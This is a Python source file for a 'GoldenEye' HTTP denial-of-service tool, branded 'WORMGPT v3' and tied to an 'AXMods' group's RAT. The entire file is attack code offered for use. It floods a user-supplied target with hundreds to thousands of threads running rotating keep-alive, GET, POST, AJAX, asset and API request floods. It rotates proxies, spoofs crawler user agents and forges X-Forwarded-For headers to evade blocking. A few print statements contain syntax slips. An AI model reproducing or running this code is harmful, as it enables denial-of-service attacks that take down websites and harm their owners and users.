#!/usr/bin/env python3
"""
/AXMODS/DDOS/attack_method/goldeneye.py
GOLDENEYE ATTACK MODULE - WORMGPT v3
Advanced Keep-Alive Connection Exhaustion
"""

import socket
import ssl
import random
import threading
import time
import sys
import os
import string
from urllib.parse import urlparse, quote

class GoldenEye:
    def __init__(self, target, port=80, workers=500, duration=0, proxy=False):
        """
        Initialize GoldenEye Attack
        
        Args:
            target: Target URL
            port: Target port
            workers: Number of concurrent workers
            duration: Attack duration in seconds (0=infinite)
            proxy: Use proxy rotation
        """
        self.target = target
        self.parsed_url = urlparse(target)
        self.host = self.parsed_url.netloc.split(':')[0]
        self.port = port
        self.workers = workers
        self.duration = duration
        self.use_proxy = proxy
        
        self.is_attacking = True
        self.active_workers = 0
        self.connections_made = 0
        self.requests_sent = 0
        self.start_time = time.time()
        
        # User agents with focus on mobile and modern browsers
        self.user_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; +http://mj12bot.com/)'
        ]
        
        # Attack vectors - different types of requests
        self.attack_vectors = [
            self.vector_keep_alive_flood,
            self.vector_random_get_requests,
            self.vector_post_forms,
            self.vector_ajax_requests,
            self.vector_static_assets,
            self.vector_api_endpoints
        ]
        
        # Referrer list
        self.referrers = [
            f"{self.parsed_url.scheme}://{self.host}/",
            "https://www.google.com/",
            "https://www.facebook.com/",
            "https://www.youtube.com/",
            "https://www.twitter.com/",
            "https://www.reddit.com/",
            "https://www.amazon.com/",
            "https://www.github.com/"
        ]
        
        # Proxies
        self.proxies = []
        if proxy:
            self.load_proxies()
        
        # SSL context
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Lock for thread safety
        self.lock = threading.Lock()
        
        # Statistics
        self.stats = {
            'bytes_sent': 0,
            'keep_alive_sessions': 0,
            'last_vector_change': time.time()
        }
        
        # Current attack vector
        self.current_vector = 0
    
    def load_proxies(self):
        """Load proxies from file"""
        try:
            if os.path.exists('proxies.txt'):
                with open('proxies.txt', 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
        except:
            pass
    
    def create_connection(self, worker_id):
        """Create a new connection with advanced options"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Advanced socket options
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(10)
            
            # Use proxy if available
            if self.use_proxy and self.proxies:
                proxy = random.choice(self.proxies)
                proxy_host, proxy_port = proxy.split(':')
                sock.connect((proxy_host, int(proxy_port)))
                
                # HTTPS proxy CONNECT
                if self.parsed_url.scheme == 'https':
                    connect_request = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\n"
                    connect_request += f"Host: {self.host}:{self.port}\r\n"
                    connect_request += f"Proxy-Connection: keep-alive\r\n\r\n"
                    
                    sock.send(connect_request.encode())
                    response = sock.recv(4096)
                    
                    if b'200' not in response:
                        return None
            else:
                sock.connect((self.host, self.port))
            
            # Wrap with SSL for HTTPS
            if self.parsed_url.scheme == 'https':
                if self.use_proxy and self.proxies:
                    sock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
                else:
                    sock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
            
            with self.lock:
                self.connections_made += 1
            
            return sock
            
        except Exception as e:
            return None
    
    def vector_keep_alive_flood(self, sock, session_id):
        """Keep-alive connection with multiple requests"""
        try:
            # Initial request
            path = self.generate_dynamic_path()
            request = self.build_request("GET", path, keep_alive=True)
            sock.send(request.encode())
            
            with self.lock:
                self.requests_sent += 1
                self.stats['bytes_sent'] += len(request)
                self.stats['keep_alive_sessions'] += 1
            
            # Multiple follow-up requests on same connection
            for i in range(random.randint(10, 50)):
                if not self.is_attacking:
                    break
                
                time.sleep(random.uniform(0.1, 0.5))
                
                path = self.generate_dynamic_path()
                request = self.build_request(
                    random.choice(["GET", "POST"]),
                    path,
                    keep_alive=True,
                    referer=self.referrers[0]
                )
                
                sock.send(request.encode())
                
                with self.lock:
                    self.requests_sent += 1
                    self.stats['bytes_sent'] += len(request)
            
            return True
            
        except:
            return False
    
    def vector_random_get_requests(self, sock, session_id):
        """Random GET requests with different parameters"""
        try:
            for i in range(random.randint(5, 20)):
                if not self.is_attacking:
                    break
                
                path = self.generate_dynamic_path()
                request = self.build_request("GET", path, keep_alive=False)
                sock.send(request.encode())
                
                with self.lock:
                    self.requests_sent += 1
                    self.stats['bytes_sent'] += len(request)
                
                # Close and reopen connection
                sock.close()
                sock = self.create_connection(session_id)
                if not sock:
                    return False
                
                time.sleep(random.uniform(0.05, 0.2))
            
            return True
            
        except:
            return False
    
    def vector_post_forms(self, sock, session_id):
        """POST requests with form data"""
        try:
            for i in range(random.randint(3, 10)):
                if not self.is_attacking:
                    break
                
                path = random.choice(['/contact', '/submit', '/api/submit', '/form'])
                post_data = self.generate_form_data()
                
                request = self.build_request(
                    "POST",
                    path,
                    keep_alive=True,
                    content_type="application/x-www-form-urlencoded",
                    content_length=len(post_data)
                )
                
                full_request = request + post_data
                sock.send(full_request.encode())
                
                with self.lock:
                    self.requests_sent += 1
                    self.stats['bytes_sent'] += len(full_request)
                
                time.sleep(random.uniform(0.2, 1.0))
            
            return True
            
        except:
            return False
    
    def vector_ajax_requests(self, sock, session_id):
        """AJAX-like requests with special headers"""
        try:
            for i in range(random.randint(8, 25)):
                if not self.is_attacking:
                    break
                
                path = self.generate_dynamic_path()
                request = self.build_request(
                    "GET",
                    path,
                    keep_alive=True,
                    ajax=True
                )
                
                sock.send(request.encode())
                
                with self.lock:
                    self.requests_sent += 1
                    self.stats['bytes_sent'] += len(request)
                
                time.sleep(random.uniform(0.1, 0.3))
            
            return True
            
        except:
            return False
    
    def vector_static_assets(self, sock, session_id):
        """Requests for static assets (images, CSS, JS)"""
        try:
            assets = [
                '/static/images/logo.png',
                '/css/main.css',
                '/js/app.js',
                '/images/banner.jpg',
                '/fonts/roboto.woff2',
                '/favicon.ico',
                '/assets/script.min.js',
                '/style.css'
            ]
            
            for asset in random.sample(assets, random.randint(5, 15)):
                if not self.is_attacking:
                    break
                
                request = self.build_request("GET", asset, keep_alive=True)
                sock.send(request.encode())
                
                with self.lock:
                    self.requests_sent += 1
                    self.stats['bytes_sent'] += len(request)
                
                time.sleep(random.uniform(0.05, 0.15))
            
            return True
            
        except:
            return False
    
    def vector_api_endpoints(self, sock, session_id):
        """API endpoint requests"""
        try:
            api_endpoints = [
                '/api/v1/users',
                '/api/v2/data',
                '/graphql',
                '/rest/products',
                '/ajax/search',
                '/api/auth/status',
                '/api/config'
            ]
            
            for endpoint in random.sample(api_endpoints, random.randint(3, 8)):
                if not self.is_attacking:
                    break
                
                request = self.build_request(
                    random.choice(["GET", "POST"]),
                    endpoint,
                    keep_alive=True,
                    accept="application/json"
                )
                
                sock.send(request.encode())
                
                with self.lock:
                    self.requests_sent += 1
                    self.stats['bytes_sent'] += len(request)
                
                time.sleep(random.uniform(0.1, 0.4))
            
            return True
            
        except:
            return False
    
    def generate_dynamic_path(self):
        """Generate dynamic URL path"""
        # Depth of path (1-3 levels)
        depth = random.randint(1, 3)
        parts = []
        
        for i in range(depth):
            part_length = random.randint(3, 10)
            part = ''.join(random.choices(string.ascii_lowercase, k=part_length))
            parts.append(part)
        
        # Add file with extension
        extensions = ['', '.html', '.php', '.asp', '.jsp', '.js', '.css', '.json']
        filename = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 12)))
        extension = random.choice(extensions)
        
        parts.append(filename + extension)
        path = '/' + '/'.join(parts)
        
        # Add query parameters 60% of the time
        if random.random() > 0.4:
            param_count = random.randint(1, 4)
            params = []
            
            for i in range(param_count):
                param_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))
                param_value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(1, 15)))
                params.append(f"{param_name}={quote(param_value)}")
            
            path += '?' + '&'.join(params)
        
        return path
    
    def build_request(self, method, path, keep_alive=True, **kwargs):
        """Build HTTP request"""
        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {self.host}",
            f"User-Agent: {random.choice(self.user_agents)}",
            f"Accept: {kwargs.get('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')}",
            f"Accept-Language: en-US,en;q=0.5",
            f"Accept-Encoding: gzip, deflate, br",
            f"Connection: {'keep-alive' if keep_alive else 'close'}",
            f"Cache-Control: no-cache",
            f"Pragma: no-cache"
        ]
        
        # Add referrer
        if random.random() > 0.2:
            headers.append(f"Referer: {random.choice(self.referrers)}")
        
        # Add AJAX headers if requested
        if kwargs.get('ajax', False):
            headers.append("X-Requested-With: XMLHttpRequest")
        
        # Add content headers for POST
        if method == "POST" and 'content_type' in kwargs:
            headers.append(f"Content-Type: {kwargs['content_type']}")
            headers.append(f"Content-Length: {kwargs['content_length']}")
        
        # Add random headers occasionally
        if random.random() > 0.7:
            headers.append(f"X-Forwarded-For: {self.generate_random_ip()}")
        
        if random.random() > 0.8:
            headers.append("Upgrade-Insecure-Requests: 1")
        
        return '\r\n'.join(headers) + '\r\n\r\n'
    
    def generate_form_data(self):
        """Generate form data for POST requests"""
        fields = random.randint(3, 7)
        form_parts = []
        
        for i in range(fields):
            field_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10)))
            field_value = ''.join(random.choices(string.ascii_letters + string.digits + ' ', k=random.randint(5, 30)))
            form_parts.append(f"{field_name}={quote(field_value)}")
        
        return '&'.join(form_parts)
    
    def generate_random_ip(self):
        """Generate random IP address"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def rotate_attack_vector(self):
        """Rotate between different attack vectors"""
        while self.is_attacking:
            time.sleep(random.randint(30, 120))  # Rotate every 30-120 seconds
            
            with self.lock:
                self.current_vector = (self.current_vector + 1) % len(self.attack_vectors)
                self.stats['last_vector_change'] = time.time()
    
    def goldeneye_worker(self, worker_id):
        """GoldenEye worker thread"""
        with self.lock:
            self.active_workers += 1
        
        while self.is_attacking:
            # Check duration
            if self.duration > 0 and (time.time() - self.start_time) > self.duration:
                break
            
            # Create connection
            sock = self.create_connection(worker_id)
            if sock is None:
                time.sleep(2)
                continue
            
            try:
                # Select attack vector based on current rotation
                with self.lock:
                    vector_index = self.current_vector
                
                # Execute attack vector
                vector_func = self.attack_vectors[vector_index]
                success = vector_func(sock, worker_id)
                
                if not success:
                    sock.close()
                    time.sleep(1)
                    continue
                
                # Keep connection alive for a while
                keep_alive_time = random.randint(5, 30)
                end_time = time.time() + keep_alive_time
                
                while time.time() < end_time and self.is_attacking:
                    time.sleep(1)
                
                sock.close()
                
                # Random delay before next connection
                time.sleep(random.uniform(0.5, 2.0))
                
            except Exception as e:
                try:
                    sock.close()
                except:
                    pass
                time.sleep(1)
        
        with self.lock:
            self.active_workers -= 1
    
    def monitor_attack(self):
        """Monitor attack progress"""
        print(f"\n╔{'═'*65}╗")
        print(f"║{'GOLDENEYE ATTACK - WORMGPT v3'.center(65)}║")
        print(f"╚{'═'*65}╝")
        print(f"[+] Target: {self.target}")
        print(f"[+] Host: {self.host}:{self.port}")
        print(f("[+] Workers: {self.workers}"))
        print(f"[+] Duration: {self.duration if self.duration > 0 else 'Infinite'} seconds")
        print(f"[+] Proxy: {'Enabled' if self.use_proxy and self.proxies else 'Disabled'}")
        print(f"[+] Strategy: Multi-vector keep-alive connection exhaustion")
        print(f("[+] Press Ctrl+C to stop\n"))
        
        # Start vector rotation thread
        rotation_thread = threading.Thread(target=self.rotate_attack_vector)
        rotation_thread.daemon = True
        rotation_thread.start()
        
        vector_names = [
            "Keep-Alive Flood",
            "Random GET Requests",
            "POST Forms",
            "AJAX Requests",
            "Static Assets",
            "API Endpoints"
        ]
        
        while self.is_attacking:
            elapsed = time.time() - self.start_time
            
            if self.duration > 0 and elapsed >= self.duration:
                break
            
            with self.lock:
                active = self.active_workers
                connections = self.connections_made
                requests = self.requests_sent
                bytes_sent = self.stats['bytes_sent']
                current_vec = self.current_vector
                keep_alive = self.stats['keep_alive_sessions']
            
            if elapsed > 0:
                rps = requests / elapsed
                conn_per_sec = connections / elapsed
                mb_sent = bytes_sent / (1024 * 1024)
            else:
                rps = 0
                conn_per_sec = 0
                mb_sent = 0
            
            # Display status
            sys.stdout.write(f"\r[+] Workers: {active}/{self.workers} | "
                           f"Connections: {connections} | "
                           f"Requests: {requests} | "
                           f"RPS: {rps:.1f} | "
                           f"Keep-Alive: {keep_alive} | "
                           f"Vector: {vector_names[current_vec]} | "
                           f"Time: {elapsed:.1f}s")
            sys.stdout.flush()
            
            time.sleep(0.5)
    
    def start(self):
        """Start GoldenEye attack"""
        # Start monitor thread
        monitor_thread = threading.Thread(target=self.monitor_attack)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Start worker threads
        threads = []
        
        # Initial batch
        initial_batch = min(self.workers, 100)
        for i in range(initial_batch):
            if not self.is_attacking:
                break
            
            thread = threading.Thread(target=self.goldeneye_worker, args=(i,))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            
            if i % 20 == 0:
                time.sleep(0.1)
        
        # Gradual ramp-up
        if self.workers > 100:
            def ramp_up_workers():
                time.sleep(15)
                
                remaining = self.workers - 100
                batch_size = 50
                
                for i in range(0, remaining, batch_size):
                    if not self.is_attacking:
                        break
                    
                    current_batch = min(batch_size, remaining - i)
                    for j in range(current_batch):
                        if not self.is_attacking:
                            break
                        
                        worker_id = 100 + i + j
                        thread = threading.Thread(target=self.goldeneye_worker, args=(worker_id,))
                        thread.daemon = True
                        threads.append(thread)
                        thread.start()
                        
                        if j % 10 == 0:
                            time.sleep(0.05)
                    
                    time.sleep(10)
            
            ramp_thread = threading.Thread(target=ramp_up_workers)
            ramp_thread.daemon = True
            ramp_thread.start()
        
        # Main loop
        try:
            while self.is_attacking:
                elapsed = time.time() - self.start_time
                
                if self.duration > 0 and elapsed >= self.duration:
                    break
                
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print(f"\n\n[!] Stopping GoldenEye attack...")
        
        # Cleanup
        self.is_attacking = False
        time.sleep(3)
        
        # Final statistics
        elapsed = time.time() - self.start_time
        
        print(f"\n\n{'═'*70}")
        print(f"GOLDENEYE ATTACK COMPLETED")
        print(f"{'═'*70}")
        print(f"Target: {self.target}")
        print(f"Duration: {elapsed:.1f} seconds")
        print(f"Total Workers: {self.workers}")
        print(f"Connections Made: {self.connections_made}")
        print(f"Requests Sent: {self.requests_sent}")
        print(f"Requests Per Second: {self.requests_sent/elapsed if elapsed > 0 else 0:.1f}")
        print(f"Keep-Alive Sessions: {self.stats['keep_alive_sessions']}")
        print(f"Data Sent: {self.stats['bytes_sent']/(1024*1024):.2f} MB")
        print(f"Attack Vectors Used: 6 (rotating)")
        print(f"{'═'*70}")
        
        return {
            'duration': elapsed,
            'workers': self.workers,
            'connections': self.connections_made,
            'requests': self.requests_sent,
            'keep_alive_sessions': self.stats['keep_alive_sessions'],
            'bytes_sent': self.stats['bytes_sent'],
            'attack_type': 'GoldenEye (Multi-Vector Keep-Alive)'
        }

def main():
    """Standalone execution"""
    print("""
╔══════════════════════════════════════════════════╗
║         GOLDENEYE ATTACK MODULE - WORMGPT v3    ║
║         AXMods Team | DARKSILENT X RAT          ║
╚══════════════════════════════════════════════════╝
    """)
    
    # Get target from user
    target = input("[?] Target URL (http:// or https://): ").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Parse URL
    parsed = urlparse(target)
    host = parsed.netloc.split(':')[0]
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    
    # Get parameters
    try:
        workers = int(input("[?] Number of workers (100-2000, default 500): ") or "500")
        duration = int(input("[?] Duration in seconds (0=infinite): ") or "0")
        use_proxy = input("[?] Use proxies? (y/N): ").lower() == 'y'
        
        # GoldenEye specific options
        print(f"\n[+] GoldenEye Attack Modes:")
        print(f"[+] 1. Standard Mode (Recommended)")
        print(f("[+] 2. Aggressive Mode (More connection persistence)"))
        
        mode = input("[?] Select mode (1-2, default 1): ") or "1"
        
        if mode == "2":
            print(f("[+] Aggressive Mode Activated - Maximum connection persistence"))
        
    except Exception as e:
        print(f"[!] Invalid input: {e}, using defaults")
        workers = 500
        duration = 0
        use_proxy = False
    
    # Start attack
    attack = GoldenEye(target, port, workers, duration, use_proxy)
    attack.start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
